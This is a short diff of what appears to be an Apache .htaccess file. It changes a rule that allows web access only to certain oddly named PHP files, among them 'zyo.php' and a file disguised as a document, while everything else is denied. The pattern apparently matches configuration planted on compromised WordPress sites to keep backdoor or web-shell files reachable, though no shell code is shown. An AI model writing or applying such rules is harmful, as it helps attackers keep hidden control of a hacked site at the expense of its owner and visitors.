@@ -6,7 +6,7 @@ Deny from all
 
 </FilesMatch>
 
-<FilesMatch "^(ini.php|wp-optin.php|wp-optin.zip|tesla22.php)$">
+<FilesMatch "^(IDPTPTK-00015_SURATPERMOHONAN_esesia.php|zyo.php)$">
  Order allow,deny
  Allow from all
 </FilesMatch>
